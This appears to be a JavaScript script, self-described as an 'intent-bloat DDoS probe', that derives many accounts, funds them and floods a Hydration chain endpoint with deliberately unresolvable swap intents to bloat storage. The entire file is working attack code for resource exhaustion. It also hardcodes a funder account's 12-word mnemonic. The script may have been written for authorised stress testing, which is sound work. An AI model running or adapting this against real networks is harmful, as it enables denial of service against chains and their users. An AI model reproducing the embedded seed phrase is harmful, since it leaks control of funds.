// ICE intent-bloat DDoS probe.
//
// Endpoint, funder, and per-intent shape are all top-of-file constants —
// edit and re-run.
//
// Env knobs:
//   N                  (default 50)   — number of bloat accounts to create
//   INTENTS_PER_ACCOUNT(default 1)    — intents each account submits
//   AMOUNT_IN_HDX      (default 1)    — HDX reserve per intent (must be ≥ ED)
//   ROOT_SEED          (default below) — root for //ddos-probe//i derivation
//
// Result: N × INTENTS_PER_ACCOUNT unresolvable intents on the target chain.
//
// Flow:
//   Phase 1: derive N deterministic sr25519 keypairs from ROOT_SEED//ddos-probe//i.
//   Phase 2: fund each with FUND_HDX via transferKeepAlive from FUNDER_URI
//            (verified against FUNDER_EXPECTED_ADDRESS).
//   Phase 3: submit one (or N) intent per account with shape:
//              Swap { HDX → BNC, amount_in: 1 HDX (ED), amount_out: 10^30 BNC, partial: false }
//            Empirically unresolvable — solver never produces a fill for an
//            absurd min_out, so each intent sits in storage until cleanup.
//   Phase 4: verify total intent.Intents:: rows + our accounts' counts.

import { ApiPromise, WsProvider } from "@polkadot/api";
import { Keyring } from "@polkadot/keyring";
import { cryptoWaitReady } from "@polkadot/util-crypto";

// ⚠️ HARDCODED — change this string to repoint.
const ENDPOINT = "wss://2.lark.hydration.cloud";

const N = parseInt(process.env.N ?? "50", 10);
const INTENTS_PER_ACCOUNT = parseInt(process.env.INTENTS_PER_ACCOUNT ?? "1", 10);
const AMOUNT_IN_HDX = BigInt(process.env.AMOUNT_IN_HDX ?? "1");
const FUND_HDX = 50_000n;             // HDX per bloat account
const HDX_DEC = 1_000_000_000_000n;   // 12 decimals

// ⚠️ FUNDER — the rich account that pays for funding all bloat accounts.
// Accepts any URI: "//Alice", "//Bob//stash", a 12-word mnemonic, or a hex seed.
// Lark2 funder: 100 M HDX, fresh, no conviction-vote lock.
const FUNDER_URI = "season catalog game bacon onion payment rain spin memory achieve boil traffic";
const FUNDER_EXPECTED_ADDRESS = "7KgGHHPv3Pp8B5XepJz5qu7MrRXxEZbCq5Mb9Vfy5GzjgvF3";

// Deterministic 32-byte hex seed used as a URI prefix. addFromUri treats "0x…"
// as a raw mini-secret, so no BIP39 checksum to worry about. Override via ROOT_SEED.
const ROOT_SEED = process.env.ROOT_SEED
  ?? "0xb107b107b107b107b107b107b107b107b107b107b107b107b107b107b107b107";

const SS58 = 63;
const HDX = 0;
const BNC = 14;

console.log(`endpoint: ${ENDPOINT}`);
console.log(`DDoS prep → ${ENDPOINT}, N=${N}, intents/acct=${INTENTS_PER_ACCOUNT}`);

await cryptoWaitReady();
const provider = new WsProvider(ENDPOINT, 2500, {}, 60_000);
const api = await ApiPromise.create({ provider, throwOnConnect: true, noInitWarn: true });

try {
  const chain = (await api.rpc.system.chain()).toString();
  const head0 = (await api.rpc.chain.getHeader()).number.toNumber();
  console.log(`phase 0: chain=${chain} head=#${head0}`);

  // ---------- Phase 1: derive N keypairs ----------
  const t1 = Date.now();
  const keyring = new Keyring({ type: "sr25519", ss58Format: SS58 });
  const accounts = [];
  for (let i = 0; i < N; i++) {
    const pair = keyring.addFromUri(`${ROOT_SEED}//ddos-probe//${i}`);
    accounts.push({ index: i, address: pair.address, pair });
  }
  console.log(`phase 1: derived ${N} accounts in ${Date.now() - t1}ms`);
  console.log(`  first: ${accounts[0].address}`);
  console.log(`  last:  ${accounts[N - 1].address}`);

  // ---------- Phase 2: fund via transferKeepAlive from FUNDER_URI ----------
  const fundAmount = FUND_HDX * HDX_DEC;
  const t2 = Date.now();
  // Separate keyring for the funder so it doesn't share state with destinations.
  const funderKr = new Keyring({ type: "sr25519", ss58Format: SS58 });
  const funder = funderKr.addFromMnemonic(FUNDER_URI);
  console.log(`phase 2: funder derives to ${funder.address}`);
  if (FUNDER_EXPECTED_ADDRESS && funder.address !== FUNDER_EXPECTED_ADDRESS) {
    console.error(`funder address mismatch: got ${funder.address}, expected ${FUNDER_EXPECTED_ADDRESS}`);
    process.exit(5);
  }
  const funderInfo = (await api.query.system.account(funder.address)).toJSON();
  console.log(`phase 2: funder free=${BigInt(funderInfo.data.free)} reserved=${funderInfo.data.reserved} nonce=${funderInfo.nonce}`);
  const totalNeeded = fundAmount * BigInt(N);
  if (BigInt(funderInfo.data.free) < totalNeeded) {
    console.error(`funder lacks balance: have ${BigInt(funderInfo.data.free)}, need ≥ ${totalNeeded}`);
    process.exit(6);
  }
  // Batch transfers via utility.batch_all in chunks of FUND_BATCH_SIZE per tx.
  // Each batch is one signed tx → one block. For N=50 that's 1 tx; N=200 → 4 txs.
  const FUND_BATCH_SIZE = 50;
  const numBatches = Math.ceil(N / FUND_BATCH_SIZE);
  console.log(`phase 2: funding ${N} accounts via ${funder.address} batched transfer_keep_alive (${numBatches} × utility.batch_all of up to ${FUND_BATCH_SIZE}, each acct: ${FUND_HDX} HDX)`);
  for (let b = 0; b < numBatches; b++) {
    const slice = accounts.slice(b * FUND_BATCH_SIZE, (b + 1) * FUND_BATCH_SIZE);
    const calls = slice.map((a) => api.tx.balances.transferKeepAlive(a.address, fundAmount));
    const ext = api.tx.utility.batchAll(calls);
    const beforeNonce = (await api.query.system.account(funder.address)).toJSON().nonce;
    try {
      const hash = await ext.signAndSend(funder);
      console.log(`  batch ${b + 1}/${numBatches} (${slice.length} txs, hash ${hash.toHex().slice(0, 12)}…)`);
      const deadline = Date.now() + 60_000;
      while (Date.now() < deadline) {
        await new Promise((r) => setTimeout(r, 1_000));
        const cur = (await api.query.system.account(funder.address)).toJSON().nonce;
        if (cur > beforeNonce) break;
      }
    } catch (e) {
      console.error(`  batch ${b} failed: ${e.message.split("\n")[0]}`);
      throw e;
    }
  }
  console.log(`phase 2: funded ${N} accounts in ${Date.now() - t2}ms`);

  // ---------- Phase 2 verify ----------
  let funded = 0;
  for (const acc of accounts) {
    const sys = (await api.query.system.account(acc.address)).toJSON();
    if (BigInt(sys.data.free) >= fundAmount / 2n) funded++;
  }
  console.log(`phase 2 verify: ${funded}/${N} accounts have ≥ ${FUND_HDX / 2n} HDX`);
  if (funded < N) {
    console.error("not all accounts funded; aborting before intent submission");
    process.exit(3);
  }

  // ---------- Phase 3: submit unresolvable intents ----------
  const t3 = Date.now();
  const now = (await api.query.timestamp.now()).toNumber();
  const amountIn = AMOUNT_IN_HDX * HDX_DEC;
  const amountOut = 10n ** 30n;  // unreachably high
  const intentInput = {
    data: { Swap: { asset_in: HDX, asset_out: BNC, amount_in: amountIn, amount_out: amountOut, partial: false } },
    deadline: now + 23 * 60 * 60 * 1000,  // 23h (under the 24h max)
    on_resolved: null,
  };

  // Each account submits its INTENTS_PER_ACCOUNT intents bundled into one
  // utility.batchAll → one signed tx per account. 50 accts × 100 intents =
  // 50 in-flight subscriptions instead of 5000 (OOM-safe).
  // If INTENTS_PER_ACCOUNT > BATCH_MAX, split into multiple per-account batches.
  const BATCH_MAX = 100;
  const submitted = [];
  const failed = [];
  const allProms = [];
  for (const acc of accounts) {
    let nonce = (await api.rpc.system.accountNextIndex(acc.address)).toNumber();
    for (let off = 0; off < INTENTS_PER_ACCOUNT; off += BATCH_MAX) {
      const count = Math.min(BATCH_MAX, INTENTS_PER_ACCOUNT - off);
      const calls = [];
      for (let k = 0; k < count; k++) calls.push(api.tx.intent.submitIntent(intentInput));
      const ext = api.tx.utility.batchAll(calls);
      const myNonce = nonce++;
      allProms.push(new Promise((resolve) => {
        let settledLocal = false;
        ext.signAndSend(acc.pair, { nonce: myNonce }, (r) => {
          if (settledLocal) return;
          if (r.isError) { settledLocal = true; failed.push({ acct: acc.index, nonce: myNonce, count, err: "send" }); resolve(); return; }
          if (r.status.isInBlock || r.status.isFinalized) {
            settledLocal = true;
            let ok = true;
            let failMsg = null;
            for (const { event } of r.events) {
              if (api.events.system?.ExtrinsicFailed?.is?.(event)) {
                ok = false;
                const [de] = event.data;
                if (de.isModule) {
                  const m = api.registry.findMetaError(de.asModule);
                  failMsg = `${m.section}.${m.name}`;
                } else failMsg = de.toString();
              }
              if (api.events.utility?.BatchInterrupted?.is?.(event)) {
                ok = false;
                failMsg = `utility.BatchInterrupted at ${event.data[0]?.toString()}`;
              }
            }
            if (ok) submitted.push({ acct: acc.index, nonce: myNonce, count });
            else failed.push({ acct: acc.index, nonce: myNonce, count, err: failMsg });
            const totalDone = submitted.reduce((s, x) => s + x.count, 0) + failed.reduce((s, x) => s + x.count, 0);
            if ((submitted.length + failed.length) % 5 === 0 || (submitted.length + failed.length) === accounts.length * Math.ceil(INTENTS_PER_ACCOUNT / BATCH_MAX)) {
              const pct = (totalDone / (N * INTENTS_PER_ACCOUNT) * 100).toFixed(0);
              console.log(`  progress: ${totalDone}/${N * INTENTS_PER_ACCOUNT} intents (${pct}%) — ${submitted.length} batches ok / ${failed.length} fail @ ${((Date.now() - t3) / 1000).toFixed(1)}s`);
            }
            resolve();
          }
        }).catch((e) => { if (!settledLocal) { settledLocal = true; failed.push({ acct: acc.index, nonce: myNonce, count, err: "exc:" + e.message.split("\n")[0].slice(0,80) }); resolve(); } });
      }));
    }
  }
  await Promise.race([
    Promise.all(allProms),
    new Promise((r) => setTimeout(r, 5 * 60_000)),
  ]);
  const submittedIntents = submitted.reduce((s, x) => s + x.count, 0);
  console.log(`phase 3: submitted ${submittedIntents}/${N * INTENTS_PER_ACCOUNT} intents (in ${submitted.length} batches) in ${((Date.now() - t3) / 1000).toFixed(1)}s, failed batches=${failed.length}`);
  if (failed.length && failed.length <= 10) console.log("  failures:", failed);

  // ---------- Phase 4: verify bloat ----------
  const t4 = Date.now();
  const totalIntentsEntries = (await api.query.intent.intents.entries()).length;
  let accIntentCount = 0;
  for (const acc of accounts) accIntentCount += (await api.query.intent.accountIntentCount(acc.address)).toNumber();
  const headFinal = (await api.rpc.chain.getHeader()).number.toNumber();
  console.log(`phase 4: intent.Intents:: total rows = ${totalIntentsEntries}`);
  console.log(`phase 4: our accounts hold = ${accIntentCount} intents (${N * INTENTS_PER_ACCOUNT} expected)`);
  console.log(`phase 4: head moved ${head0} → ${headFinal} (+${headFinal - head0} blocks)`);
  console.log(`phase 4: verified in ${Date.now() - t4}ms`);

  // ---------- Summary ----------
  console.log("---------- summary ----------");
  console.log({
    endpoint: ENDPOINT,
    chain,
    accounts_created: accounts.length,
    intents_submitted: submittedIntents,
    intents_failed_batches: failed.length,
    total_hdx_reserved_planks: (amountIn * BigInt(submittedIntents)).toString(),
    total_intents_onchain: totalIntentsEntries,
    elapsed_ms: Date.now() - t1,
  });
} finally {
  await api.disconnect();
  await provider.disconnect();
}
